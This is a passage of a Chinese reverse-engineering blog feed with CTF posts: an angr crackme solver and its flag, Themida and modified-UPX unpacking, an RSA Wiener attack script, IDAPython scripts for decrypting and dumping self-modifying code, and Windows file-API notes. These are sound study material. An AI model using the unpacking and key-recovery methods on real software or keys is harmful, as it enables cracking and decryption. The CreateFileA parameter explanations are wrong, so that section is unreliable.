class="number">1</span>]&amp;&amp;d[<span class="number">2</span>]==k[<span class="number">2</span>]&amp;&amp;d[<span class="number">3</span>]==k[<span class="number">3</span>]&amp;&amp;d[<span class="number">4</span>]==k[<span class="number">4</span>]&amp;&amp;d[<span class="number">5</span>]==k[<span class="number">5</span>]&amp;&amp;d[<span class="number">6</span>]==k[<span class="number">6</span>]&amp;&amp;d[<span class="number">7</span>]==k[<span class="number">7</span>]&amp;&amp;d[<span class="number">8</span>]==k[<span class="number">8</span>]&amp;&amp;d[<span class="number">9</span>]==k[<span class="number">9</span>]&amp;&amp;</span><br><span class="line">d[<span class="number">10</span>]==k[<span class="number">10</span>]&amp;&amp;d[<span class="number">11</span>]==k[<span class="number">11</span>]&amp;&amp;d[<span class="number">12</span>]==k[<span class="number">12</span>]&amp;&amp;d[<span class="number">13</span>]==k[<span class="number">13</span>]&amp;&amp;d[<span class="number">14</span>]==k[<span class="number">14</span>]&amp;&amp;d[<span class="number">15</span>]==k[<span class="number">15</span>]&amp;&amp;d[<span class="number">16</span>]==k[<span class="number">16</span>]&amp;&amp;d[<span class="number">17</span>]==k[<span class="number">17</span>]&amp;&amp;d[<span class="number">18</span>]==k[<span class="number">18</span>]&amp;&amp;d[<span class="number">19</span>]==k[<span class="number">19</span>]&amp;&amp;</span><br><span class="line">d[<span class="number">20</span>]==k[<span class="number">20</span>]&amp;&amp;d[<span class="number">21</span>]==k[<span class="number">21</span>]&amp;&amp;d[<span class="number">22</span>]==k[<span class="number">22</span>]&amp;&amp;d[<span class="number">23</span>]==k[<span class="number">23</span>]&amp;&amp;d[<span class="number">24</span>]==k[<span class="number">24</span>]&amp;&amp;d[<span class="number">25</span>]==k[<span class="number">25</span>]&amp;&amp;d[<span class="number">26</span>]==k[<span class="number">26</span>]&amp;&amp;d[<span class="number">27</span>]==k[<span class="number">27</span>]&amp;&amp;d[<span class="number">28</span>]==k[<span class="number">28</span>]&amp;&amp;d[<span class="number">29</span>]==k[<span class="number">29</span>]&amp;&amp;</span><br><span class="line">d[<span class="number">30</span>]==k[<span class="number">30</span>]&amp;&amp;d[<span class="number">31</span>]==k[<span class="number">31</span>]&amp;&amp;d[<span class="number">32</span>]==k[<span class="number">32</span>]&amp;&amp;d[<span class="number">33</span>]==k[<span class="number">33</span>]&amp;&amp;d[<span class="number">34</span>]==k[<span class="number">34</span>]&amp;&amp;d[<span class="number">35</span>]==k[<span class="number">35</span>]&amp;&amp;d[<span class="number">36</span>]==k[<span class="number">36</span>]&amp;&amp;d[<span class="number">37</span>]==k[<span class="number">37</span>]&amp;&amp;d[<span class="number">38</span>]==k[<span class="number">38</span>]&amp;&amp;d[<span class="number">39</span>]==k[<span class="number">39</span>]&amp;&amp;</span><br><span class="line">d[<span class="number">40</span>]==k[<span class="number">40</span>]&amp;&amp;d[<span class="number">41</span>]==k[<span class="number">41</span>]&amp;&amp;d[<span class="number">42</span>]==k[<span class="number">42</span>]&amp;&amp;d[<span class="number">43</span>]==k[<span class="number">43</span>]&amp;&amp;d[<span class="number">44</span>]==k[<span class="number">44</span>]</span><br><span class="line">)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;you are right!&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;no!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  这里是当输入是123456789012345678901234567890123456789012345时加密后的结果</span></span><br><span class="line"><span class="comment">  0x3A, 0x7B, 0x7E, 0x1D, 0x5A, 0x24, 0xC8, 0xB5, 0x47, 0x7C, </span></span><br><span class="line"><span class="comment">  0xF9, 0x3A, 0x53, 0xDA, 0xE3, 0x06, 0xDE, 0x58, 0x58, 0xA6, </span></span><br><span class="line"><span class="comment">  0x8D, 0x73, 0xFB, 0x5B, 0x5F, 0xD6, 0xFA, 0x9D, 0x4D, 0x10, </span></span><br><span class="line"><span class="comment">  0x9F, 0x42, 0xD4, 0xE4, 0xFD, 0xAC, 0x78, 0x92, 0x61, 0x21, </span></span><br><span class="line"><span class="comment">  0x6B, 0x33, 0x55, 0x98, 0xA7</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure><p>这里为了让angr能够正常执行，我们在最后加密后的数据与密文比较时，不要使用for循环，而是一个一个的比较，然后全部用&amp;&amp;连接。</p><h1 id="angr代码"><a href="#angr代码" class="headerlink" title="angr代码"></a>angr代码</h1><p>用angr运行就很简单了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line">path=<span class="string">&quot;C:\\Users\\DELL\\Desktop\\_raffle.exe&quot;</span></span><br><span class="line">project=angr.Project(path,auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">start_addr=<span class="number">0x401F4A</span></span><br><span class="line">initial_state=project.factory.blank_state(addr=start_addr)</span><br><span class="line"></span><br><span class="line">passwordsize=<span class="number">45</span>*<span class="number">8</span></span><br><span class="line">password=claripy.BVS(<span class="string">&#x27;password&#x27;</span>,passwordsize)</span><br><span class="line">password_addr=<span class="number">0x408040</span></span><br><span class="line">initial_state.memory.store(password_addr,password)</span><br><span class="line"></span><br><span class="line">simulation=project.factory.simulation_manager(initial_state)</span><br><span class="line"></span><br><span class="line">simulation.explore(find=<span class="number">0x4023CF</span>,avoid=<span class="number">0x4023DD</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> simulation.found:</span><br><span class="line">        solution_state=i</span><br><span class="line">        solution = solution_state.solver.<span class="built_in">eval</span>(password, cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">        <span class="built_in">print</span>(solution)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no!&quot;</span>)</span><br><span class="line">    <span class="comment"># w3_4r3_901ng_70_raffl3_0fF_A_g0...g0-r0u71n3!</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> angr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>themida一键脱壳</title>
      <link href="/2023/04/01/2023-04-01-themida%E4%B8%80%E9%94%AE%E8%84%B1%E5%A3%B3/"/>
      <url>/2023/04/01/2023-04-01-themida%E4%B8%80%E9%94%AE%E8%84%B1%E5%A3%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="工具名称"><a href="#工具名称" class="headerlink" title="工具名称"></a>工具名称</h1><p>unlicense</p><p>链接：</p><blockquote><p><a href="https://github.com/ergrelet/unlicense/releases">https://github.com/ergrelet/unlicense/releases</a></p></blockquote><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>下载下来之后，会有py打包后的exe文件</p><p>注意32位和64位的不同程序</p><p>然后直接将待脱壳的文件拖入exe就可以了……</p><p>没错，就是这么简单</p><p>一键脱壳yyds</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> themida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>魔改upx工具脱壳</title>
      <link href="/2023/03/28/2023-03-28-%E9%AD%94%E6%94%B9upx%E5%B7%A5%E5%85%B7%E8%84%B1%E5%A3%B3%E6%96%B9%E6%B3%95/"/>
      <url>/2023/03/28/2023-03-28-%E9%AD%94%E6%94%B9upx%E5%B7%A5%E5%85%B7%E8%84%B1%E5%A3%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前一直学的是用esp定律进行脱壳，可是脱完壳的软件往往无法运行。</p><p>而之前也从来没有接触过对upx壳进行修改的方法，导致使用 upx -d 命令不成功。</p><p>本文就upx魔改的方法来讲解一下如何使用十六进制工具+upx -d进行脱壳。顺便复习一下PE文件知识。</p><p>本文的主要内容来自于下面这个链接</p><p>链接如下：</p><blockquote><p><a href="https://www.pianshen.com/article/4621592135/">https://www.pianshen.com/article/4621592135/</a></p></blockquote><h1 id="UPX壳的特征"><a href="#UPX壳的特征" class="headerlink" title="UPX壳的特征"></a>UPX壳的特征</h1><h2 id="1-区段名"><a href="#1-区段名" class="headerlink" title="1. 区段名"></a>1. 区段名</h2><p>upx壳保护的exe文件中，会有以下几个区段，upx0,upx1,resc。</p><p>其中upx0的实际大小是0。</p><p>实际上，UPX压缩器将这些节区压缩后放置于UPX1中，并且将压缩和解压代码也放到里面去。一旦该程序被加载运行，位于UPX1节的解压缩代码会释放原数据到UPX0中并且让PE正常运行。</p><blockquote><p><a href="https://blog.csdn.net/qq_37232329/article/details/97131186">https://blog.csdn.net/qq_37232329/article/details/97131186</a></p></blockquote><p>“.rsrc”是程序资源信息区段名，这个区段含有原资源段的完整头部以及图标、Manifest、版本等未被压缩的资源，当然还有UPX自身需要的导入信息等（如果程序自身不含资源段，加壳后就是“UPX2”）。</p><h2 id="2-upx1头部的信息"><a href="#2-upx1头部的信息" class="headerlink" title="2. upx1头部的信息"></a>2. upx1头部的信息</h2><p>在upx1这个区段中，最开始是关于upx壳的信息，比如版本、压缩方式等等。</p><p>这段内容对程序运行无影响，但对工具脱壳有影响。</p><p><img src="/../imgs/202303281657686.jpg" alt="upx"></p><p>这段信息如果进行修改，那么就无法使用-d命令进行脱壳了。</p><h1 id="修复upx信息"><a href="#修复upx信息" class="headerlink" title="修复upx信息"></a>修复upx信息</h1><p>通过以上知识，我们只需要将Upx壳的关键信息进行恢复，那么就可以使用upx -d命令进行脱壳了。</p><p>常见的魔改upx壳的方法就是单纯的修改区段名和upx1的信息,因此我们在十六进制工具中，找到对应的信息进行修改就好了。</p><h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>emmmm ，这么一点东西是不是不值得写在博客里？</p><p>手动脱壳？见我第一篇文章。</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> upx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA维纳共计脚本</title>
      <link href="/2023/03/28/2023-03-28-RSA%20%E7%BB%B4%E7%BA%B3%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC%EF%BC%88%E6%8A%84%E7%9A%84%EF%BC%89/"/>
      <url>/2023/03/28/2023-03-28-RSA%20%E7%BB%B4%E7%BA%B3%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC%EF%BC%88%E6%8A%84%E7%9A%84%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, libnum,gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continuedFra</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算连分数</span></span><br><span class="line"><span class="string">    :param x: 分子</span></span><br><span class="line"><span class="string">    :param y: 分母</span></span><br><span class="line"><span class="string">    :return: 连分数列表</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cf = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cf.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> cf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算传入列表最后的渐进分数</span></span><br><span class="line"><span class="string">    :param cf: 连分数列表</span></span><br><span class="line"><span class="string">    :return: 该列表最后的渐近分数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    numerator = <span class="number">0</span></span><br><span class="line">    denominator = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cf[::-<span class="number">1</span>]:</span><br><span class="line">        <span class="comment"># 这里的渐进分数分子分母要分开</span></span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    <span class="keyword">return</span> numerator, denominator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pq</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;使用韦达定理解出pq，x^2−(p+q)∗x+pq=0</span></span><br><span class="line"><span class="string">    :param a:x^2的系数</span></span><br><span class="line"><span class="string">    :param b:x的系数</span></span><br><span class="line"><span class="string">    :param c:pq</span></span><br><span class="line"><span class="string">    :return:p，q</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    par = gmpy2.isqrt(b * b - <span class="number">4</span> * a * c)</span><br><span class="line">    <span class="keyword">return</span> (-b + par) // (<span class="number">2</span> * a), (-b - par) // (<span class="number">2</span> * a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getGradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算列表所有的渐近分数</span></span><br><span class="line"><span class="string">    :param cf: 连分数列表</span></span><br><span class="line"><span class="string">    :return: 该列表所有的渐近分数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    gf = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(cf) + <span class="number">1</span>):</span><br><span class="line">        gf.append(gradualFra(cf[:i]))</span><br><span class="line">    <span class="keyword">return</span> gf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param e:</span></span><br><span class="line"><span class="string">    :param n:</span></span><br><span class="line"><span class="string">    :return: 私钥d</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cf = continuedFra(e, n)</span><br><span class="line">    gf = getGradualFra(cf)</span><br><span class="line">    <span class="keyword">for</span> d, k <span class="keyword">in</span> gf:</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>: <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">        p, q = solve_pq(<span class="number">1</span>, n - phi + <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> p * q == n:</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = wienerAttack(e, n)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CRYPTO </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SMC的一些知识</title>
      <link href="/2023/03/27/2023-03-27-SMC%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/"/>
      <url>/2023/03/27/2023-03-27-SMC%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是SMC"><a href="#什么是SMC" class="headerlink" title="什么是SMC"></a>什么是SMC</h1><p><code>SMC</code>，即<code>Self Modifying Code</code>，动态代码加密技术，指通过修改代码或数据，阻止别人直接静态分析，然后在动态运行程序时对代码进行解密，达到程序正常运行的效果。</p><p>（上面这一部分是从别人的博客里抄的）</p><p>简单来说，就是在程序内部对代码进行改变，一般是直接对字节码进行操作。</p><h1 id="SMC的一些特征"><a href="#SMC的一些特征" class="headerlink" title="SMC的一些特征"></a>SMC的一些特征</h1><p>SMC既可以修改代码，也可以修改数据，一般来说，数据段是可读可写的，但是代码段是只读的，因此如果想对代码段的字节码进行修改，肯定改变代码段的属性，使其变成可读可写的。</p><h2 id="1-Windows-系统下"><a href="#1-Windows-系统下" class="headerlink" title="1. Windows 系统下"></a>1. Windows 系统下</h2><p>在 <code>Windows</code> 程序中使用了<code>VirtualProtect()</code>函数来改变虚拟内存区域的属性。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">VirtualProtect</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD flNewProtect,</span></span></span><br><span class="line"><span class="params"><span class="function">PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">VirtualProtect()函数有4个参数，</span></span><br><span class="line"><span class="comment">lpAddress是要改变属性的内存起始地址，</span></span><br><span class="line"><span class="comment">dwSize是要改变属性的内存区域大小，</span></span><br><span class="line"><span class="comment">flAllocationType是内存新的属性类型，</span></span><br><span class="line"><span class="comment">lpflOldProtect内存原始属性类型保存地址。*/</span></span><br></pre></td></tr></table></figure><p>一般会将第三个参数设置成0x40。</p><h2 id="2-Linux-系统下"><a href="#2-Linux-系统下" class="headerlink" title="2. Linux 系统下"></a>2. Linux 系统下</h2><p>在 <code>Linux</code> 程序中使用<code>mprotect()</code>函数来改变虚拟内存区域的属性。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> `mprotect`(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> prot);</span><br><span class="line"><span class="comment">/*mprotect()系统调用修改起始位置为addr，长度为length字节的虚拟内存区域中分页上的保护。</span></span><br><span class="line"><span class="comment">addr取值必须为分页大小的整数倍，</span></span><br><span class="line"><span class="comment">length会被向上舍入到系统分页大小的下一个整数倍。</span></span><br><span class="line"><span class="comment">prot参数是一个位掩码。*/</span></span><br></pre></td></tr></table></figure><h1 id="修复正常的代码以静态分析"><a href="#修复正常的代码以静态分析" class="headerlink" title="修复正常的代码以静态分析"></a>修复正常的代码以静态分析</h1><h2 id="1-使用OD、x96dbg-dump下来"><a href="#1-使用OD、x96dbg-dump下来" class="headerlink" title="1.使用OD、x96dbg dump下来"></a>1.使用OD、x96dbg dump下来</h2><p>优点：简单，容易操作</p><p>缺点：dump后的程序可能不能运行</p><p>但是仍然可以拖进IDA中进行静态分析</p><p>操作步骤：</p><ol><li>首先运行程序至运行完解密函数。</li><li>之后就dump下来，OD的操作方法是右键选择Ollydump，注意把OEP的位置改为原来的OEP，并且选择重建输入表（不过这一点可能没有必要了，我们目的不是为了让dump后的程序还能运行，只是为了查看解密后的伪代码）。x96dbg也类似，点击菜单栏的“插件”，然后点击“Scylla”,先检查OEP是否正确，如果不正确需要手动更改，然后点击“IAT Autosearch”,IAT自动搜索到之后，再点击”Dump”,注意这时候要保存一个文件，记住这个文件的名字，一般是源文件名_dump.exe  保存完之后，再点击“Get Imports”,再点击”Fix Dump”,这时候要选择更改dump之后的文件，并生成一个新的文件，这时候就已经完成了。</li><li>X96操作请看下面这两个链接：</li><li><blockquote><p><a href="https://www.52pojie.cn/thread-1534675-1-1.html">https://www.52pojie.cn/thread-1534675-1-1.html</a></p><p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=1742334&highlight=%EF%BF%BD%EF%BF%BD%EF%BF%BD">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1742334&amp;highlight=%BA%EC%B0%FC</a></p></blockquote></li><li>这样会重新生成一个exe文件，这个文件就可以拖入IDA中分析了。</li></ol><h2 id="2-使用IDA的动态调试dump下来"><a href="#2-使用IDA的动态调试dump下来" class="headerlink" title="2.使用IDA的动态调试dump下来"></a>2.使用IDA的动态调试dump下来</h2><p>与第一点的操作类似</p><p>但是有些复杂的地方，经过解密代码之后，，字节码是正确的，但是IDA很有可能无法分析，我们需要手动调整使得IDA分析产生伪代码</p><p>操作步骤：</p><ol><li><p>解密完成后，先在那一串刚刚解密后的字节码往下找，找到第一个retn指令（原则，找到main函数块，retn指令就是main函数的结束位置）</p></li><li><p>然后选中从main函数头一直到retn范围的字节码，右键选择分析”分析选中的区域“，然后点击Force。这里需要注意的一点是，IDA可能询问是否按照EIP进行分析（类似的话），这里要选择否。</p></li><li><p>捣鼓完后按下F5，如果仍然无法生成伪代码，那就自己编辑函数范围。首先找到retn指令的下一个地址，记下来。然后在main函数头的右键点击“编辑函数”，然后在函数的结束位置填入刚刚找到的地址就可以了。应当注意的是，这个范围是左闭右开的，这也就是为什么我刚才说要找到retn指令的下一个地址。捣鼓完后就可以按下F5查看伪代码了。</p></li></ol><h2 id="3-使用IDApython将代码进行修改"><a href="#3-使用IDApython将代码进行修改" class="headerlink" title="3.使用IDApython将代码进行修改"></a>3.使用IDApython将代码进行修改</h2><p>基本使用操作与我之前的文章中花指令那一节是一样的。</p><p>这个写一个简单的脚本模板以供参考：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">saddr=<span class="number">0x401000</span>  <span class="comment">#开始位置</span></span><br><span class="line">eaddr=<span class="number">0x404000</span>  <span class="comment">#结束位置</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(saddr,eaddr):</span><br><span class="line">    k=get_wide_byte(i)</span><br><span class="line">    patch_byte(i,k^<span class="number">0x99</span>)</span><br></pre></td></tr></table></figure><p>关键的两个函数就是get_wide_byte和patch_byte</p><h1 id="SMC派生问题（我没有找到这类问题的官方叫法）"><a href="#SMC派生问题（我没有找到这类问题的官方叫法）" class="headerlink" title="SMC派生问题（我没有找到这类问题的官方叫法）"></a>SMC派生问题（我没有找到这类问题的官方叫法）</h1><p>一般来说,SMC只是程序自身代码的修改，而不是重新生成一个二进制文件，但是，毫无疑问，重新生成一个二进制文件，然后将这个文件加载进一个新的进程，这种办法是可行的。</p><p>这样的话，我们使用IDA进行解密的时候就必须将其dump下来，生成一个新的文件。</p><p>这里介绍一个Windows下的API函数，当然不能单纯的将这个函数看做SMC派生问题的标志、</p><p>FindResourceA函数</p><p>确定具有指定模块中指定类型和名称的资源的位置。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">HRSRC <span class="title">FindResourceA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           LPCSTR  lpName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           LPCSTR  lpType</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>简单来说，这个函数是可以用来找到需要解密的资源的位置。</p><p>我们可以使用Resource Hacker 这个软件来查找这个资源模块。 </p><h2 id="IDApython-dump-脚本"><a href="#IDApython-dump-脚本" class="headerlink" title="IDApython dump 脚本"></a>IDApython dump 脚本</h2><p>在这个资源文件解密完成后，我们可以用IDApython 将其dump下来。</p><p>这里简单提一下PE文件格式，开头一定是“MZ”这个样子，只要找到了这样的标志，说明解密成功了，已经可以开始dump了！</p><p>脚本模板：(从一个大佬博客那里抄的)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    begin = <span class="number">0x17C6A86B940</span>; <span class="comment">#需对应修改</span></span><br><span class="line">    size = <span class="number">0x16000</span>  <span class="comment"># #需对应修改</span></span><br><span class="line">    list1 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">        byte_tmp = get_bytes(begin + i,<span class="number">1</span>)</span><br><span class="line">        list1.append(<span class="built_in">ord</span>(byte_tmp))</span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">1</span>) % <span class="number">0x1000</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;All count:&#123;&#125;, collect current:&#123;&#125;, has finish &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(size), <span class="built_in">hex</span>(i + <span class="number">1</span>), <span class="built_in">float</span>(i + <span class="number">1</span>) / size))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;collect over&#x27;</span>)</span><br><span class="line">    file = <span class="string">&quot;C:\\Users\\DELL\\Desktop\\dump.exe&quot;</span> <span class="comment">#需对应修改</span></span><br><span class="line">    <span class="comment">#print(bytearray(list1))</span></span><br><span class="line">    buf = <span class="built_in">bytearray</span>(list1)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fw:</span><br><span class="line">        fw.write(buf)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;write over&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 混淆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件操作</title>
      <link href="/2023/03/27/2023-03-27-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
      <url>/2023/03/27/2023-03-27-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前段时间遇到了一些对文件操作的题目，因此这里介绍一下常见的文件操作API函数（不是大全，只是本人遇到的）</p><h1 id="CreatFileA"><a href="#CreatFileA" class="headerlink" title="CreatFileA"></a>CreatFileA</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateFileA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCSTR                lpFileName,</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD                 dwDesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD                 dwShareMode,</span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD                 dwCreationDisposition,</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD                 dwFlagsAndAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE                hTemplateFile</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">各个参数的作用是：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">- lpFileName：指定要创建或打开的文件名或设备名。</span></span><br><span class="line"><span class="comment">- dwDesiredAccess：指定对文件或设备的访问权限。</span></span><br><span class="line"><span class="comment">- dwShareMode：指定其他进程可以与文件或设备共享的方式。</span></span><br><span class="line"><span class="comment">- lpSecurityAttributes：指定一个安全描述符，控制对文件或设备的访问。</span></span><br><span class="line"><span class="comment">- dwCreationDisposition：指定如何创建或打开文件或设备。</span></span><br><span class="line"><span class="comment">- dwFlagsAndAttributes：指定文件或设备的属性和标志。</span></span><br><span class="line"><span class="comment">- hTemplateFile：指定一个文件句柄，用于指定要创建的文件的属性。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CreatefileA函数的作用是创建或打开一个文件或设备，并返回一个句柄，可以使用该句柄对文件或设备进行读写等操作。*/</span></span><br></pre></td></tr></table></figure><p>这个以一个例子来讲解这个函数</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">CreateFileA</span>(<span class="string">&quot;C:\\nk.ctf&quot;</span>, <span class="number">0x80000000</span>, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0x80u</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>参数1：文件路径名，字符串类型，指定创建的文件名和路径</p><p>参数2：文件访问控制标志，指定文件的访问权限和共享方式，0x80000000表示以独占方式打开文件</p><p>参数3：文件创建标志，指定文件的创建方式和属性，1u表示创建一个新文件</p><p>参数4：文件句柄模板，指定一个已经打开的文件句柄，0表示不使用模板句柄</p><p>参数5：文件操作方式，指定文件的读写方式，3u表示以可读可写方式打开文件</p><p>参数6：文件属性标志，指定文件的属性，0x80u表示将文件设置为临时文件</p><p>参数7：文件的扩展属性，指定文件的扩展属性，0表示不设置扩展属性。</p><p>需要注意的是，这个函数是创建或者打开一个文件，也就是说如果这个文件不存在的话才会创建这个文件，因此我们可以手动创建这个文件，然后让这个函数执行打开这个文件的命令。</p><h1 id="ReadFile"><a href="#ReadFile" class="headerlink" title="ReadFile"></a>ReadFile</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">ReadFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE       hFile,</span></span></span><br><span class="line"><span class="params"><span class="function">  LPVOID       